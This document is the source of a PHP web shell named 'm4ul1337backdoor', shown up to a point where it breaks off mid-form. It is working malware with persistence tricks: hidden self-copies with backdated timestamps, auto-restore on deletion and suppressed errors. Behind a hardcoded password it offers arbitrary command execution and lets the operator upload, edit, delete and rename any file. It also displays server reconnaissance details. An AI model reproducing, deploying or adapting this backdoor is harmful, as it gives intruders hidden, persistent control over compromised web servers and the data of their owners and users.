<?php

$self = $_SERVER['SCRIPT_FILENAME'];
$backup_path = dirname($self) . '/.' . md5($self) . '.cache';

register_shutdown_function(function() use ($self, $backup_path) {
    if (!file_exists($self) && file_exists($backup_path)) {
        @copy($backup_path, $self);
        @chmod($self, 0444);
        @touch($self, time());
    }
});

if (!file_exists($backup_path)) {
    @copy($self, $backup_path);
    @chmod($backup_path, 0444);
    @touch($backup_path, strtotime('-30 days'));
}

$hidden_dirs = array(
    dirname($self) . '/.cache/.' . md5($self) . '.tmp',
    sys_get_temp_dir() . '/.' . md5($_SERVER['HTTP_HOST']) . '.tmp',
);
foreach ($hidden_dirs as $hd) {
    $hd_dir = dirname($hd);
    if (!file_exists($hd_dir)) @mkdir($hd_dir, 0755, true);
    if (!file_exists($hd)) {
        @copy($self, $hd);
        @chmod($hd, 0444);
        @touch($hd, strtotime('-60 days'));
    }
}

@ini_set('display_errors', 0);
@ini_set('error_reporting', 0);
@ini_set('max_execution_time', 0);
@ini_set('memory_limit', '-1');
@ignore_user_abort(true);
@set_time_limit(0);
@clearstatcache();

// ==================== CONFIG ====================
$shell_config = array(
    'username' => 'ytmaulxploit',
    'password' => 'ytmaulxploit',
);

// ==================== SESSION ====================
if (session_status() === PHP_SESSION_NONE) session_start();

// ==================== LOGIN ====================
if (!isset($_SESSION['m4ul_auth'])) {
    if (isset($_POST['usrname']) && isset($_POST['password'])) {
        if ($_POST['usrname'] == $shell_config['username'] && md5($_POST['password']) == md5($shell_config['password'])) {
            $_SESSION['m4ul_auth'] = true;
            $_SESSION['m4ul_user'] = $_POST['usrname'];
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else { $login_error = 'Access Denied!'; }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>~ m4ul1337backdoor ~</title>
        <link href="https://fonts.googleapis.com/css2?family=Iceland&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #000;
                font-family: 'Iceland', monospace;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                color: #00FF00;
            }
            .login-wrap { text-align: center; }
            .login-wrap img {
                border-radius: 50%;
                margin-bottom: 20px;
                width: 220px; height: 220px;
                border: none;
            }
            .login-box {
                background: #000;
                border: 1px solid #0E304A;
                padding: 25px 30px;
                width: 360px;
            }
            .login-box .title {
                color: #FF0000;
                font-size: 18px;
                font-weight: normal;
                letter-spacing: 3px;
                margin-bottom: 5px;
            }
            .login-box .sub {
                color: #67ABDF;
                font-size: 10px;
                letter-spacing: 4px;
                margin-bottom: 20px;
            }
            .login-box input[type="text"],
            .login-box input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 6px 0;
                background: #000;
                border: 1px solid #0E304A;
                color: #999;
                font-family: 'Iceland', monospace;
                font-size: 13px;
                outline: none;
                letter-spacing: 1px;
            }
            .login-box input:focus { border-color: #27979B; color: #fff; }
            .login-box input[type="submit"] {
                width: 100%;
                padding: 10px;
                margin-top: 12px;
                background: #0E304A;
                color: #00FF00;
                border: 1px solid #27979B;
                cursor: pointer;
                font-family: 'Iceland', monospace;
                font-size: 14px;
                letter-spacing: 3px;
            }
            .login-box input[type="submit"]:hover { background: #27979B; color: #000; }
            .err { color: #ff0000; font-size: 10px; margin-top: 8px; letter-spacing: 1px; }
            .ver { color: #dfff00; font-size: 9px; margin-top: 12px; letter-spacing: 2px; }
        </style>
    </head>
    <body>
        <div class="login-wrap">
            <img src="https://i.gyazo.com/8859fcb2128258ee487f2bf2fa48df0c.jpg" alt="m4ul1337backdoor" draggable="false">
            <div class="login-box">
                <div class="title">~ m4ul1337backdoor ~</div>
                <div class="sub">Babayo Team // Babayo eror system</div>
                <form method="POST">
                    <input type="text" name="usrname" placeholder="Username" autocomplete="off">
                    <input type="password" name="password" placeholder="Password">
                    <input type="submit" value=">> ACCESS <<">
                    <?php if (isset($login_error)) echo '<div class="err">'.$login_error.'</div>'; ?>
                </form>
                <div class="ver">M4ul1337 Backdoor</div>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==================== LOGOUT ====================
if (isset($_GET['logout'])) { session_destroy(); header('Location: '.$_SERVER['PHP_SELF']); exit; }

// ==================== CORE ====================
$pwd = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$pwd || !is_dir($pwd)) $pwd = getcwd();
chdir($pwd);

$msg = '';

// Upload
if (isset($_FILES['f'])) {
    $t = $_FILES['f']['tmp_name']; $n = $_FILES['f']['name'];
    if (@copy($t, $pwd.'/'.$n)) $msg = 'OK: '.$n;
    elseif (@move_uploaded_file($t, $pwd.'/'.$n)) $msg = 'OK: '.$n;
    elseif (@file_put_contents($pwd.'/'.$n, @file_get_contents($t))) $msg = 'OK: '.$n;
    else $msg = 'FAIL!';
}

// Delete
if (isset($_GET['d'])) { $x = $_GET['d']; if (@unlink($x)) $msg = 'Deleted: '.basename($x); elseif (@rmdir($x)) $msg = 'Deleted: '.basename($x); }

// Rename
if (isset($_POST['o']) && isset($_POST['nn'])) { if (@rename($_POST['o'], $_POST['nn'])) $msg = 'Renamed!'; }

// Edit
if (isset($_POST['sf']) && isset($_POST['fc'])) { @file_put_contents($_POST['sf'], $_POST['fc']); $msg = 'Saved!'; }

// CMD Exec
$cmd_out = '';
if (isset($_POST['cmd'])) {
    $cmd_out = @shell_exec($_POST['cmd']);
    if ($cmd_out === null) $cmd_out = 'Command failed or disabled.';
}

// Server Info
$si = array(
    'Uname' => php_uname(),
    'PHP' => phpversion().' ('.php_sapi_name().')',
    'Server' => $_SERVER['SERVER_SOFTWARE'] ?? '?',
    'IP:Port' => ($_SERVER['SERVER_ADDR']??'?').':'.($_SERVER['SERVER_PORT']??'80'),
    'You' => $_SERVER['REMOTE_ADDR'],
    'User' => @get_current_user() ?: getmyuid(),
    'Safe' => ini_get('safe_mode') ? 'ON' : 'OFF',
    'D-Func' => ini_get('disable_functions') ?: 'none',
    'Disk' => function_exists('disk_free_space') ? round(disk_free_space($pwd)/1024/1024/1024,2).'G free' : '?',
    'Time' => date('Y-m-d H:i:s'),
);

// Scan
$dirs = array(); $files = array();
if ($h = @opendir($pwd)) {
    while (false !== ($e = readdir($h))) {
        if ($e == "." || $e == "..") continue;
        $fp = $pwd.'/'.$e; $isd = is_dir($fp);
        $it = array(
            'n' => $e, 'p' => $fp, 'd' => $isd,
            's' => $isd ? '[DIR]' : round(filesize($fp)/1024,2).'K',
            'pm' => substr(sprintf('%o', fileperms($fp)), -4),
            'o' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($fp))['name'] : fileowner($fp),
            'g' => function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($fp))['name'] : filegroup($fp),
            'm' => date('d-M-y H:i', filemtime($fp)),
        );
        if ($isd) $dirs[] = $it; else $files[] = $it;
    }
    closedir($h);
}

// Breadcrumb
$pts = explode('/', trim(str_replace('\\', '/', $pwd), '/'));
$cb = ''; $bd = '';
foreach ($pts as $i => $pt) { $bd .= '/'.$pt; $cb .= '<a href="?path='.urlencode($bd).'">'.$pt.'</a>/'; }
$cb = rtrim($cb, '/');
?>
<!DOCTYPE html>
<html>
<head>
    <title>m4ul1337backdoor ~ <?php echo basename($pwd); ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Iceland&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #00FF00;
            font-family: 'Iceland', monospace;
            font-size: 11px;
            font-weight: normal;
        }
        a { color: #00FF00; text-decoration: none; }
        a:hover { color: #fff; }

        .header {
            border: 1px solid #0E304A;
            background: #000;
            padding: 10px 12px;
            margin: 8px;
        }
        .header .htop {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 8px;
            padding-bottom: 8px;
            border-bottom: 1px solid #0E304A;
        }
        .header .htop .hl {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .header .htop .hl img {
            width: 200px; height: 200px;
            border-radius: 8px;
        }
        .header .htop .hl .di { color: #67ABDF; font-size: 10px; line-height: 1.5; }
        .header .htop .hl .di span { color: #00FF00; }
        .header .htop .hr { text-align: right; color: #27979B; font-size: 10px; min-width: 160px; }
        .header .htop .hr b { color: #00FF00; }
        .header .htop .hr .out {
            color: #ff0000; border: 1px solid #ff0000;
            padding: 2px 6px; margin-left: 6px; font-size: 10px;
        }
        .header .htop .hr .out:hover { background: #ff0000; color: #000; }

        .header .hinfo {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            font-size: 9px;
        }
        .header .hinfo .hcell {
            border: 1px solid #0E304A;
            padding: 4px 8px;
            background: #0a0a0a;
            white-space: nowrap;
        }
        .header .hinfo .hcell .hk { color: #27979B; }
        .header .hinfo .hcell .hv { color: #67ABDF; }
        .header .hinfo .hcell .hg { color: #00FF00; }
        .header .hinfo .hcell .hr2 { color: #ff0000; }

        #ml { border-color: #0E304A; }

        .nav {
            border: 1px solid #0E304A;
            background: #0E304A;
            margin: 0 8px;
            padding: 4px 10px;
            display: flex;
            gap: 2px;
            flex-wrap: wrap;
        }
        .nav a {
            color: #00FF00; padding: 3px 8px;
            font-size: 10px; letter-spacing: 1px;
        }
        .nav a:hover { background: #27979B; color: #000; }

        .ajaxarea { border: 1px solid #0E304A; }

        .wrap { margin: 8px; display: flex; flex-direction: column; gap: 8px; }

        .ibox {
            border: 1px solid #0E304A;
            background: #000;
            padding: 8px 10px;
        }
        .ibox table { width: 100%; border-collapse: collapse; }
        .ibox td { padding: 2px 5px; font-size: 10px; }
        .ik { color: #27979B; }
        .iv { color: #67ABDF; }
        .ion { color: #00FF00; }
        .ioff { color: #ff0000; }

        .crumb {
            border: 1px solid #0E304A;
            background: #000;
            padding: 6px 10px;
            font-size: 10px;
            color: #67ABDF;
        }
        .crumb a { color: #00FF00; }

        .up {
            border: 1px solid #0E304A;
            background: #000;
            padding: 6px 10px;
            display: flex;
            align-items: center;
            gap: 6px;
            flex-wrap: wrap;
        }
        .up input[type="file"] { color: #00FF00; font-family: 'Iceland', monospace; font-size: 10px; }
        .ubtn {
            background: #0E304A; color: #00FF00; border: 1px solid #27979B;
            padding: 3px 10px; cursor: pointer; font-family: 'Iceland', monospace;
            font-size: 10px; letter-spacing: 1px;
        }
        .ubtn:hover { background: #27979B; color: #000; }
        .umsg { color: #00FF00; font-size: 10px; }

        .cmdbox {
            border: 1px solid #0E304A;
            background: #000;
            padding: 8px 10px;
        }
        .cmdbox input[type="text"] {
            background: #000; color: #999; border: 1px solid #0E304A;
            padding: 5px 8px; font-family: 'Iceland', monospace;
            font-size: 11px; outline: none; width: 250px;
        }
        .cmdbox input[type="text"]:focus { border-color: #27979B; color: #fff; }
        .cmdbox pre {
            background: #0a0a0a; color: #67ABDF; padding: 6px;
            margin-top: 6px; font-family: 'Courier New', monospace;
            font-size: 10px; max-height: 200px; overflow: auto;
            border: 1px solid #0E304A;
        }

        .mt { width: 100%; border-collapse: collapse; }
        .mt th {
            background: #0E304A; color: #fff; padding: 5px 6px;
            font-size: 10px; text-align: left; letter-spacing: 1px;
            border: 1px solid #0E304A;
        }
        .mt td {
            padding: 3px 6px; font-size: 10px;
            border-bottom: 1px solid #111; color: #fff;
        }
        .mt tr:hover { background: #0a0a0a; }
        .fd { color: #FFFF00; }
        .ff { color: #fff; }
        .sz { color: #67ABDF; }
        .pg { color: #25ff00; }
        .pr { color: #FF0000; }
        .pw { color: #fff; }
        .act a { color: #fff; margin: 0 2px; font-size: 9px; }
        .act a:hover { color: #27979B; }
        .adel { color: #ff0000 !important; }

        .ed {
            border: 1px solid #0E304A; background: #000;
            padding: 10px;
        }
        .ed h3 { color: #00ff7f; font-size: 11px; margin-bottom: 8px; }
        .ed textarea {
            width: 100%; height: 370px; background: #000; color: #999;
            border: 1px solid #0E304A; padding: 6px;
            font-family: 'Courier New', monospace; font-size: 11px; outline: none;
        }
        .ed textarea:focus { border-color: #27979B; color: #fff; }
        .ebtn {
            background: #0E304A; color: #00FF00; border: 1px solid #27979B;
            padding: 4px 12px; cursor: pointer; font-family: 'Iceland', monospace;
            font-size: 10px; letter-spacing: 1px; margin-top: 6px;
        }
        .ebtn:hover { background: #27979B; color: #000; }
        .can { color: #efbe73; margin-left: 6px; font-size: 10px; }

        .rn {
            border: 1px solid #0E304A; background: #000;
            padding: 10px;
        }
        .rn h3 { color: #00ff7f; font-size: 11px; margin-bottom: 8px; }
        .rn input[type="text"] {
            background: #000; color: #fff; border: 1px solid #0E304A;
            padding: 5px 8px; font-family: 'Iceland', monospace;
            font-size: 11px; outline: none; width: 260px;
        }
        .rn input[type="text"]:focus { border-color: #27979B; }
        .rbtn {
            background: #0E304A; color: #00FF00; border: 1px solid #27979B;
            padding: 4px 12px; cursor: pointer; font-family: 'Iceland', monospace;
            font-size: 10px; letter-spacing: 1px; margin-left: 6px;
        }
        .rbtn:hover { background: #27979B; color: #000; }

        .foot {
            border-color: #0E304A;
            border-top: 1px solid #0E304A;
            margin: 8px;
            padding: 8px;
            text-align: center;
            font-size: 9px; color: #27979B;
        }
        .foot .cp { color: #dfff00; }

        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #1e82b5; border-radius: 3px; }
    </style>
</head>
<body>

<div class="header">
    <div class="htop">
        <div class="hl">
            <img src="https://i.gyazo.com/8859fcb2128258ee487f2bf2fa48df0c.jpg" alt="m4ul1337backdoor" draggable="false">
            <div class="di">
                <span><?php echo php_uname('s'); ?></span> <?php echo php_uname('r'); ?><br>
                <span><?php echo $_SERVER['SERVER_ADDR'] ?? '?'; ?></span> : <?php echo $_SERVER['SERVER_PORT'] ?? '80'; ?><br>
                <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?>
            </div>
        </div>
        <div class="hr">
            <b><?php echo $_SESSION['m4ul_user']; ?></b>@<b><?php echo basename($pwd); ?></b><br>
            PHP <b><?php echo phpversion(); ?></b> | <?php echo date('H:i:s'); ?>
            <a href="?logout=1" class="out">X</a>
        </div>
    </div>
    
    <div class="hinfo">
        <div class="hcell"><span class="hk">OS:</span> <span class="hv"><?php echo php_uname(); ?></span></div>
        <div class="hcell"><span class="hk">PHP:</span> <span class="hv"><?php echo phpversion().' ('.php_sapi_name().')'; ?></span></div>
        <div class="hcell"><span class="hk">SAPI:</span> <span class="hv"><?php echo php_sapi_name(); ?></span></div>
        <div class="hcell"><span class="hk">Zend:</span> <span class="hv"><?php echo zend_version(); ?></span></div>
        <div class="hcell"><span class="hk">MaxExec:</span> <span class="hv"><?php echo ini_get('max_execution_time'); ?>s</span></div>
        <div class="hcell"><span class="hk">MemLimit:</span> <span class="hv"><?php echo ini_get('memory_limit'); ?></span></div>
        <div class="hcell"><span class="hk">Upload:</span> <span class="hv"><?php echo ini_get('upload_max_filesize'); ?></span></div>
        <div class="hcell"><span class="hk">Post:</span> <span class="hv"><?php echo ini_get('post_max_size'); ?></span></div>
        <div class="hcell"><span class="hk">User:</span> <span class="hv"><?php echo @get_current_user() ?: getmyuid(); ?></span></div>
        <div class="hcell"><span class="hk">UID:</span> <span class="hv"><?php echo getmyuid(); ?>:<?php echo getmygid(); ?></span></div>
        <div class="hcell"><span class="hk">Safe:</span> <span class="<?php echo ini_get('safe_mode')?'hr2':'hg'; ?>"><?php echo ini_get('safe_mode')?'ON':'OFF'; ?></span></div>
        <div class="hcell"><span class="hk">DFunc:</span> <span class="hv"><?php echo ini_get('disable_functions') ?: 'none'; ?></span></div>
        <div class="hcell"><span class="hk">Disk:</span> <span class="hv"><?php echo function_exists('disk_free_space') ? round(disk_free_space($pwd)/1024/1024/1024,2).'G' : '?'; ?></span></div>
        <div class="hcell"><span class="hk">IP:</span> <span class="hv"><?php echo $_SERVER['SERVER_ADDR']??'?'; ?>:<?php echo $_SERVER['SERVER_PORT']??'80'; ?></span></div>
        <div class="hcell"><span class="hk">You:</span> <span class="hg"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></div>
    </div>
</div>

<div class="nav" id="ml">
    <a href="?path=<?php echo urlencode(getcwd()); ?>">~</a>
    <a href="?path=<?php echo urlencode($pwd); ?>">↻</a>
    <a href="<?php echo $_SERVER['PHP_SELF']; ?>">/</a>
    <a href="?path=<?php echo urlencode($pwd); ?>&edit=<?php echo urlencode($_SERVER['SCRIPT_FILENAME']); ?>">✎ shell</a>
    <a href="#cmd">>_</a>
</div>

<div class="wrap">

    <div class="ibox">
        <table>
            <?php $c = 0; foreach ($si as $k => $v): if ($c % 5 == 0) echo '<tr>'; ?>
                <td class="ik"><?php echo $k; ?></td>
                <td class="iv <?php echo ($v=='ON'?'ion':($v=='OFF'?'ioff':'')); ?>"><?php echo $v; ?></td>
            <?php if (++$c % 5 == 0) echo '</tr>'; endforeach; ?>
        </table>
    </div>

    <div class="crumb">📁 <?php echo $cb; ?></div>

    <div class="up">
        <form method="POST" enctype="multipart/form-data" style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
            <input type="file" name="f">
            <input typ
